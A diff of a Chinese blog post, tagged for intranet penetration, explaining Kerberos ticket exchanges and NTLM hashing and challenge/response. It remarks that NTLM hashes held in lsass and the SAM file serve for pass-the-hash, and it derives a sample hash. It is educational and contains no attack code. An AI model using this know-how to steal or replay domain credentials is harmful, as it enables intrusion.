+<p>物理层面上，AD 和 KDC 都是域控。</p>
+<h4 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h4><ul>
+<li>长期使用的密钥不应用于在网络上传输</li>
+<li>只有 KDC 维护数据库（Account Database）来保存域中主机的 Master Key</li>
+</ul>
+<h4 id="Keyberos-认证流程"><a href="#Keyberos-认证流程" class="headerlink" title="Keyberos 认证流程"></a>Keyberos 认证流程</h4><p>Keyberos 认证大致包含三个子过程：</p>
+<ul>
+<li>Client 向 KDC 申请 TGT（Ticket Granting Ticket）</li>
+<li>Client 通过获得的 TGT 向 KDC 申请用于访问 Server 的 Ticket</li>
+<li>Client 向 Server 提交 Ticket 用于认证</li>
+</ul>
+<p>认证过程通过3个 Sub-protocol 完成，分别对应上面的3个子过程：</p>
+<ul>
+<li>Authentication Service Exchange</li>
+<li>Ticket Granting Service Exchange</li>
+<li>Client&#x2F;Server Exchange</li>
+</ul>
+<h4 id="Authentication-Service-Exchange"><a href="#Authentication-Service-Exchange" class="headerlink" title="Authentication Service Exchange"></a>Authentication Service Exchange</h4><p>通过这个 Sub-protocol，KDC（中的 AS）实现对 Client 身份的确认，并颁发给 Client 一个 TGT，具体过程如下：</p>
+<p>Client 向 KDC 的 Authentication Service 发送 Authentication Service Request（<strong>KRB_AS_REQ</strong>），为了确保 KRB_AS_REQ 仅限于自己和 KDC 知道，Client 使用自己的 Master Key 对 KRB_AS_REQ  的主体部分进行加密（KDC可以通过 Domain 的Account Database 获取该 Client 的 Master  Key），KRB_AS_REQ 的主体部分包含以下内容：</p>
+<ul>
+<li>Pre-autentication data：包含用以证明自己身份的信息，一般是一个被 Client 的 Master Key 加密的 Timestamp</li>
+<li>Client name &amp; realm：简单来说就是 Domain_name\Client</li>
+<li>Server Name：这里的 Server Name 不是 Client 想要访问的 Server 的名称，而是 KDC 的 Ticket Granting Service 的 Server Name</li>
+</ul>
+<p>AS 通过接收到的 KRB_AS_REQ 验证发送方是否为在 Client name &amp; realm 中声明的那个人，即使用从  Account Database 中提取的 Client 对应的 Master Key 对 Pre-authentication data  解密，如果得到了合法的 Timestamp，即可证明发送方提供的密码正确。</p>
+<p>验证通过后，AS 将一份 Authentication Service Response（<strong>KRB_AS_REP</strong>）发送给 Client。KRB_AS_REP 主要包含两个部分：本 Client 的 Master Key 加密过的 Session  Key（SKDC-Client; Logon Session Key）和被自己（KDC）加密过的 TGT，而 TGT 包含以下内容：</p>
+<ul>
+<li>Session Key; SKDC-Client; Logon Session Key</li>
+<li>Client name &amp; realm: Domain_name&#x2F;Client</li>
+<li>End time: TGT 到期时间</li>
+</ul>
+<p>Client 通过自己的 Master Key 对第一部分解密获得 Session Key 和加密的 TGT，使用 TGT 进入下一步</p>
+<h4 id="Ticket-Granting-Service-Exchange"><a href="#Ticket-Granting-Service-Exchange" class="headerlink" title="Ticket Granting Service Exchange"></a>Ticket Granting Service Exchange</h4><p>TGS Exchange 通过 Client 向 KDC 中的 TGS 发送 Ticket Granting Service Request（<strong>KRB_TGS_REQ</strong>）开始，KRB_TGS_REQ 大体包含以下内容：</p>
+<ul>
+<li>TGT：Client 通过 AS Exchange 获得 Ticket Granting Ticket，TGT 被 KDC 的  Master Key 加密</li>
+<li>Authenticator：用以证明 TGT 的拥有者就是自己，所以必须以 TGT 的方法方（KDC）和自己的 Session Key（SKDC-Client）来进行加密</li>
+<li>Client name &amp; realm：Domain_name&#x2F;Client</li>
+<li>Server name &amp; realm：Domain_name&#x2F;Server，这里的 Server 是 Client 试图访问的 Server</li>
+</ul>
+<p>TGS 收到 KRB_TGS_REQ 后，使用自己（KDC）的 Master Key对 Client 提供的 TGT 进行解密，获得这个  Logon Session Key，再通过这个 Logon Session Key 解密 Authenticator 进行验证，通过后向对方发送 Ticket Granting Service Response（<strong>KRB_TGS_REP</strong>），由两部分组成：使用 Logon Session Key 加密的用于 Client 和 Server 通信的 Session Key  （SServer-Client）和使用 Server 的 Master Key 加密的 Ticket，该 Ticket 包含以下内容：</p>
+<ul>
+<li>Session Key：SServer-Client</li>
+<li>Client name &amp; realm：Domain_name&#x2F;Client</li>
+<li>End time：Ticket 的到期时间</li>
+</ul>
+<p>Client 收到 KRB_TGS_REP，使用 Logon Session Key 解密第一部分获得 Session Key（SServer-Client），Client 使用这个 Session Key 和 Ticket 与 Server 交互。</p>
+<h4 id="Client-x2F-Server-Exchange"><a href="#Client-x2F-Server-Exchange" class="headerlink" title="Client&#x2F;Server Exchange"></a>Client&#x2F;Server Exchange</h4><p>Client 通过 TGS Exchange 获得 Client 和 Server  的 Session Key，用 Session Key 加密  Authenticator，并将这个加密过的 Authenticator 和 Ticket 作为 Application Service  Request（<strong>KRB_AP_REQ</strong>）发送给 Server，除了上述两项内容意外，KRB_AP_REQ 还包含一个 Flag 用于表示 Client 是否需要进行双向验证（Mutual Authentication）。</p>
+<p>Server 接收到 KRB_AP_REQ 之后，通过自己的 Master Key 解密 Ticket，从而获得 Session  Key，用 Session Key 解密 Authenticator，验证对方的身份。如果需要双向验证， Server 从  Authenticator 提取 Timestamp，使用 Session Key（SServer-Client）加密发送给 Client 验证 Server 的身份。</p>
+<h4 id="User2User-Sub-Protocol"><a href="#User2User-Sub-Protocol" class="headerlink" title="User2User Sub-Protocol"></a>User2User Sub-Protocol</h4><p>由以上三个子过程进行的验证过程仍然是不完善的，因为使用了长期的密钥（Server Master Key）在网络上传输。解决方案是采用一个 Short-term 的 Session-Key 而不是 Server Master  Key 对 Ticket 进行加密，这就是 User2User Protocol。用于加密 Ticket 的是 Server 和 KDC 之间的 Session Key。</p>
+<p>原本在 AS Exchange 阶段，Client 获得的 TGT 中的 Ticket </p>
+<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>通常意义上的 NTLM Hash 指存储在 SAM 数据库 以及 NTDS 数据库中对密码进行 Hash 摘要计算后的结果。这类 Hash 可以直接用于 PTH，并且通常存在于 <code>lsass</code>进程中便于 SSP（NTLM 安全支持提供程序）使用</p>
+<p>生成过程：</p>
+<ul>
+<li>用户密码：<code>susi2001</code> </li>
+<li>首先，密码经过十六进制转为 <code>7375736932303031</code> </li>
+<li>将十六进制结果转为 Unicode格式 <code>73007500730069003200300030003100</code></li>
+<li>以 Hex（16进制）数据作 MD4加密 <code>ed3202726368f8e9fd23e78fbfac8c13</code></li>
+</ul>
+<p>其中的 MD4 加密使用 HashCalc</p>
+<h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p> Windows 不存储用户的铭文密码，它会将用户的明文密码经过加密后存储在 SAM（Security Account Manager Database）中，SAM 的路径为<code>%SystemRoot%\system32\config\sam</code>。</p>
+<p>在进行本地认证时，用户登录，系统将用户输入的明文密码转换成 NTLM Hash，与 SAM 数据库中的 NTLM Hash 进行比较来实现认证。</p>
+<p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code> 显示登陆界面，也就是输入框，接受输入后，将密码交给 <code>lsass</code> 进程，这个进程中会存有一份明文密码，将明文密码加密成 NTLM Hash，对比 SAM 数据库中的 Hash 进行验证。</p>
+<h4 id="NTLM-1"><a href="#NTLM-1" class="headerlink" title="NTLM"></a>NTLM</h4><p>NTLM 是一种网络认证协议，是以 NTLM Hash 作呕为根本凭证进行认证的协议。基于质询&#x2F;应答（Challenge&#x2F;Response）消息交换模式，常用于在工作组和域环境下登陆场景的身份认证</p>
+<p>认证方式分为交互式认证和非交互式认证。</p>
+<ul>
+<li>交互式认证：使用域账号登录到客户端，涉及客户端和域控两部分</li>
+<li>非交互式认证：在已经登陆的客户端上使用 SSO 方式访问一台服务器，涉及客户端、域控和服务器。</li>
+</ul>
+<h4 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h4><p>NTLM 协议的认证过程有三步：</p>
+<ul>
+<li>协商：主要用于确认双方协议版本（NTLMv1，NTLMv2 等）</li>
+<li>质询：质询&#x2F;应答（Challenge&#x2F;Response）模式，用于信息交换</li>
+<li>验证：验证身份的合法性，同窗由 Server 端或者 DC 完成这个过程</li>
+</ul>
+<p>大致流程：</p>
+<ul>
+<li>使用用户名和密码尝试登陆客户端</li>
+<li>客户端对密码进行哈希处理并缓存密码 Hash，丢弃实际的明文密码（不存储），然后将用户名发送给服务器，发起认证请求</li>
+<li>服务器生成一个 16 字节的随机数，成为质询（Challenge）或随机数（nonce aspx），并发送给客户端</li>
+<li>客户端使用缓存的 Hash 对 Challenge 进行加密，加密结果为 Response，然后将结果发送给服务器</li>
+<li>服务器发送三项数据给域控：User name；发送给客户端的 Challenge（已加密）；从客户端接收到的 Response</li>
+<li>域控使用 User name 从 AD 中检索该用户密码的 NTLM Hash，并使用此 NTLM Hash来加密 Challenge，然后把这个值和客户端计算的响应值（Response）进行比较，相同则验证成功</li>
+</ul>
+<h4 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h4><p>经过 NTLM Hash 加密的 Challenge 结果在网络协议中成为 Net NTLM Hash，包含在 Response 中</p>
+<h4 id="NTLM-v2"><a href="#NTLM-v2" class="headerlink" title="NTLM v2"></a>NTLM v2</h4><p>相比于 NTLM v1，NTLM v2 把 Challenge 从 8 byte 改为 16 byte，计算 Net NTLM Hash 的算法由 DES 改为 HMAC-MD5</p>
 
       
 
@@ -204,6 +994,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">内网</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -254,7 +1055,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/04/27/Dont-hit-without-hesitation/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -268,18 +1069,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2022/04/27/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Windows核心编程
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/04/27/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
+    <a href="/2022/04/27/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Windows核心编程</div>
       <i class="icon-circle-right"></i>
     </a>
   
